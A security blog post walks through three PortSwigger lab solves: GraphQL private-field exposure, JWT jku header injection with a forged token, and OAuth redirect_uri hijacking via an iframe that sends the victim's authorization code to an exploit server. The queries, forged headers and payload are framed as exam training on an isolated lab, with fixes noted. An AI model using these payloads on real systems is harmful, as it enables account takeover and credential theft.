---
layout: post
title: "Three Rolls, Nothing on Screen: A GraphQL Field, a JWT Header, and a Redirect That Phoned Home"
date: 2026-11-18
categories: [web-security, walkthrough]
tags: [portswigger, bscp, graphql, introspection, jwt, jku, oauth, redirect-uri, exploit-server, burp-suite]
excerpt: "Three more step-two rolls, and every one of them punished the same instinct: I scanned the input the page handed me, it came back clean, and the real bug was sitting in a GraphQL field the UI never requests, a JWT header I don't see, or a redirect_uri the interface fills in for me."
lang: en
page_id: three-rolls-nothing-on-screen
permalink: /posts/three-rolls-nothing-on-screen/
---

I pointed hashcat at the session token, loaded a 113,000-line wordlist, and waited for a secret that was never coming. `Token length exception`, it said, and I read it the way you read any tool complaining about input — wrong flag, malformed hash, my fault somehow. I spent a few minutes massaging the token before the obvious finally landed: the header said `RS256`. There is no secret. You don't pull an RSA private key out of a wordlist, and those four words were hashcat's blunt way of telling me I'd brought a password-cracker to an asymmetric-crypto problem.

That was the middle of three rolls today, and all three closed the same way: the thing I needed was never on the screen I was staring at. A GraphQL page that never renders a password but admits, under introspection, that the field exists. A search box that scanned clean because the bug was in how the server verifies a signature, not in anything I could type. An OAuth login where the exploitable parameter is one the UI fills in for me and I never see. The [last session]({% post_url 2026-11-17-five-rolls-into-step-two %}) landed the same lesson from a cookie and a mass-assignment field. This one just moved it off the page entirely.

## The setup

Same [Mystery Pool]({% post_url 2026-10-04-mystery-pool %}), Escalation card ticked, Practitioner level, step two of the BSCP chain — privilege escalation. Three rolls, three different topics: GraphQL, JWT, OAuth. Two of them came up as **direct topics** — the categories the Mystery Lab doesn't cover, so my tool opens them by their real launch URL and the title spoils itself the moment it loads. I'd rather roll broadly across step two than keep every title hidden, so that's a price I keep paying.

Tooling: Burp with Repeater and the native **GraphQL** tab, the **JWT Editor** extension, the exploit server, and — briefly, embarrassingly — hashcat.

## The session

### Roll 1 — The field the account page never asks for (GraphQL)

I logged in as a normal user and watched the traffic. The My Account page doesn't render through a plain `GET` — it fires a `POST` to a GraphQL endpoint with a `getUser` query. First move on any GraphQL endpoint, before anything clever: **introspection**. Burp makes this free — send the request to Repeater, open the **GraphQL** tab, hit **Set introspection query**, and Burp writes the full `__schema` query for me instead of me hand-rolling it.

```graphql
query IntrospectionQuery {
  __schema {
    types { name fields { name } }
  }
}
```

I sent it, saved the schema, and read the `User` type. There it was — a field the interface never shows:

```
type User {
  id
  username
  password   <-- the account page never renders this
}
```

No bypass. No injection. The exploit is just *asking for the field that shouldn't be reachable*:

```graphql
query {
  getUser(id: 1) {
    id
    username
    password
  }
}
```

`id: 1` is the administrator. The response came back with the username and the password in plaintext — the UI had simply never requested that field, and the resolver never thought to hide it. Log in as administrator, delete `carlos`, lab solved. This is **over-fetching a private field** — the whole class name of the lab (*Accidental exposure of private GraphQL fields*) is the vuln description.

The exam-relevant distinction I want to nail here, because the next GraphQL lab won't be this generous: introspection was **on**. When it's off, you don't give up — you fall back to **field suggestions**, the `"Did you mean ..."` hints GraphQL servers leak in error messages when you guess a close-but-wrong field name. Introspection hands you the whole schema; suggestions let you brute the schema one field at a time. Know which tool you're holding:

| Recon method | When it works | What you get |
|---|---|---|
| **Introspection** (`__schema`) | server leaves it enabled | the entire schema in one request |
| **Field suggestions** (`Did you mean`) | introspection disabled, suggestions on | one field name per guess, from the error |
| **Clairvoyance / wordlist** | both locked down | brute-forced field names |

**The rabbit hole**: this bug is boring in the best way — a single over-fetched field — so the time-sink is *inventing complexity it doesn't have*. I did not need a mutation, an alias, a batched query, or `__proto__`. If you catch yourself reaching for alias-based brute force here, you've already lost the five minutes.

### Roll 2 — The JWT that was never going to crack (jku injection)

This one opened with a decoy. There's a search box; I scanned it; it came back clean. Not safe-clean — *nothing-here* clean, because I was aiming the scanner at the wrong layer. Then I logged in with `wiener:peter`, looked at the session cookie, and saw the real surface: it's a JWT.

```
GET /my-account?id=wiener
Cookie: session=eyJraWQiOiI2NWFlYzU5ZS1jNzU2L...<RS256 token>
```

Decoded:

```json
// header
{ "kid": "65aec59e-c756-435e-b5ae-6d6ccf91fde2", "alg": "RS256" }
// payload
{ "iss": "portswigger", "exp": 1795032730, "sub": "wiener" }
```

`RS256`, a `kid` that's a UUID, `sub: wiener`. The goal writes itself — flip `sub` to `administrator` — the question is *which* JWT lab this is, because half the family shares this exact starting token and the attack diverges from there.

And here's where I wasted my ten minutes. I saw `alg: RS256`, my brain pattern-matched to "weak signing key," and I threw hashcat at it:

```bash
hashcat -a 0 -m 16500 <token> jwt.secrets.list
# Token length exception: 1/1 hashes
# No hashes loaded.
```

I read `Token length exception` as a formatting problem and fiddled with the token for a while before the penny dropped: **`-m 16500` is for HMAC JWTs** — HS256/384/512, the symmetric family where a shared secret signs and verifies. `RS256` is asymmetric. There is no secret to guess; signing needs the server's RSA **private** key, and verifying uses the **public** one. hashcat wasn't malfunctioning. It was refusing a problem that has no password in it. Lesson, carved in: **read `alg` before you brute-force.** `RS` / `ES` / `PS` → asymmetric → put the wordlist away.

So which lab? The decision tree I now run on sight, instead of guessing:

| What I try | If it works → lab |
|---|---|
| Tamper `sub`, don't re-sign | signature not verified |
| `alg: none`, strip the signature | flawed signature verification |
| `alg: HS256` + weak secret (hashcat) | weak signing key *(HMAC only — not this token)* |
| Is `/.well-known/jwks.json` exposed? | algorithm confusion, or a key to abuse |
| Inject a `jwk` header with my own public key | jwk header injection |
| `jku` header pointing at my exploit server | **jku header injection** |
| `kid` pointing at a file (`../../dev/null`) + empty key | kid path traversal |

A targeted Burp scan on the token settled it instantly — **"JWT arbitrary jku header supported," High, Certain**. The server trusts the `jku` header: it will fetch the verification key from *any* URL the token names. So I give it a URL I own.

The exploit, in JWT Editor:

1. **New RSA Key → Generate.** Now *I* hold a private key.
2. Host my **public** key as a JWK Set on the exploit server:

   ```json
   { "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "<my-kid>", "n": "<my-modulus>" } ] }
   ```
3. Forge the token — `sub: administrator` — and set the header to point `jku` at that file, with the `kid` matching my key:

   ```json
   { "kid": "<my-kid>", "alg": "RS256", "jku": "https://<exploit-server>/exploit" }
   ```
4. **Sign** with my private key, *Don't modify header* ticked so it doesn't strip the `jku`.
5. Send it to `/admin`, delete `carlos`.

The server reads my `jku`, downloads *my* public key, verifies the signature — which is valid, because I signed it with the matching private key — and concludes the token is authentic. The crypto is flawless; it just verified against a key I handed it. Same shape as the OAuth roll below, and the same shape as every "trust the token's own pointer" bug: **`jwk` carries the key, `jku` links the key, `kid` selects the key — one bug in three coats.**

### Roll 3 — The 302 Repeater wouldn't follow (OAuth redirect_uri)

Social login. The flow hands the browser off to an OAuth provider, which — after auth — redirects back to the app with an authorization `code`. The address the provider sends that code to is `redirect_uri`. In a healthy setup the provider pins it to an allow-list. Here it validated nothing: I could set it to anything.

```
GET /auth?client_id=...&redirect_uri=https://<exploit-server>&response_type=code&scope=openid%20profile%20email
```

> If I decide **where** the provider delivers the victim's code, I make it deliver to me.

I confirmed it in Repeater and got my first dead end — a self-inflicted one:

```
HTTP/2 302 Found
Location: https://<exploit-server>/?code=4lHu7Pdri56mX6z1SE5XP9hcFG1X4FI-TkSvqVUij61
```

The 302 was perfect, the code was right there in the `Location`... and the exploit server's access log was **empty**. I stared at it longer than I'd like to admit before remembering: **Repeater doesn't follow redirects.** A 302 is an *instruction* to the browser — "now go here." Repeater reads the instruction and stops. Nothing ever hits the exploit server, so nothing gets logged. You need something that *obeys* the redirect: a real browser.

That's exactly why the attack is built on an `<iframe>` delivered to the victim:

```html
<iframe src="https://<oauth-server>/auth?client_id=...&redirect_uri=https://<exploit-server>&response_type=code&scope=openid%20profile%20email"></iframe>
```

The victim (admin) is **already authenticated to the provider**, so loading the iframe triggers a silent redirect — no login prompt — and the browser *follows* the 302, dropping admin's `code` into my access log. I lift the code and spend it on the real callback:

```
GET /oauth-callback?code=<stolen-code>
```

The app swaps the code for admin's identity and logs me in as admin. Delete `carlos`. Done.

Two things that cost people this lab: the `code` is **single-use** — burn the test one, re-deliver — and you have to pick the **victim's** request out of the log, not your own probe. And the exam-flavored caveat: this is the one **interactive** roll of the three. It needs the simulated victim to exist and be logged in. You don't get to solve it at your own pace.

## The pattern

Three rolls, three topics, one spine: **the input the page offered me was a decoy, and the bug lived in something the interface never surfaces.**

- GraphQL — the UI renders `username`, never `password`. Introspection confesses the field is there and the resolver serves it anyway.
- JWT — the search box scans clean; the vuln is in *how the server fetches its verification key*, driven by a header (`jku`) I don't normally see.
- OAuth — the exploitable parameter (`redirect_uri`) is one the client fills in for me; I only reach it by intercepting the request.

And two of the three share a tighter pattern worth naming on its own: **the server trusts an attacker-controlled pointer to its own trust anchor.** JWT `jku` points at the key that validates the token; OAuth `redirect_uri` points at the destination that receives the code. In both, the mechanism is sound and the fix is identical — *never let the request choose where trust comes from; pin it to an allow-list.*

## Exam and field

All three sit in **Stage 2 — privilege escalation**. How I'd recognize each one fast, under the clock:

- **GraphQL**: the tell is the endpoint itself. See `/graphql` (or a `POST` with a `query` body) and your first move is introspection via Burp's GraphQL tab — *before* you think about the vuln. Read the type fields and hunt for anything the UI never requests. Non-interactive.
- **JWT**: decode the token on sight. Read `alg` first — it kills the wrong path (no hashcat on `RS256`). Then check `/.well-known/jwks.json` and run a targeted scan on the token; `kid`/`jku`/`jwk` in the header each point at a different lab. Non-interactive.
- **OAuth**: intercept the `/auth` request and try changing `redirect_uri` to an arbitrary host. A 302 that cheerfully carries the `code` to your host is the whole finding. Interactive — budget for the victim.

The rabbit holes, each one a real minute I lost or nearly lost:

- hashcat on an `RS256` token — there is no symmetric secret; the error is telling you the attack is wrong, not the input.
- Reaching for GraphQL mutations / aliases / batching when the bug is a single over-fetched field.
- Trusting Repeater's empty log on an OAuth redirect — Repeater doesn't follow 302s; only a browser does.

Interactive vs not matters here: GraphQL and JWT you solve alone, at full speed. OAuth `redirect_uri` makes you wait on a victim — prefer the non-interactive wins when the clock is the enemy.

## What comes next

Step two still has gaps I haven't posted: **access control** (IDOR, hidden parameters, horizontal vs vertical), **CORS** (reflected ACAO with credentials, `null` origin), and **password reset** logic (predictable tokens, host-header poisoning). The JWT family alone has more coats to try — `algorithm confusion` and `kid path traversal` are the two live candidates on a token like this one, and I only closed `jku` today. Those are the next rolls.

## Takeaways

- A `Token length exception` from `hashcat -m 16500` on an `RS256` token isn't a formatting bug — it's "no symmetric secret exists here." Read `alg` before you ever load a wordlist.
- GraphQL introspection *is* the recon step: the schema lists fields the UI will never request. Ask for them. When introspection's off, fall back to `"Did you mean"` field suggestions.
- `jwk` / `jku` / `kid` are one bug in three coats — the server lets the token dictate which key verifies it. The fix for all three is an allow-list, not cleverer validation.
- Repeater doesn't follow redirects. An OAuth `code` only reaches your exploit-server log when a real browser obeys the 302 — that's why the attack rides an iframe delivered to a logged-in victim.
- Prefer non-interactive wins (GraphQL, JWT) over interactive ones (OAuth `redirect_uri`) under exam time — you never wait on a victim.

## Useful references

- PortSwigger Lab — [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- PortSwigger Lab — [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
- PortSwigger Lab — [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [botesjuan — BSCP Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- Burp extension — **JWT Editor** (BApp Store) · Burp's built-in **GraphQL** tab for introspection

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
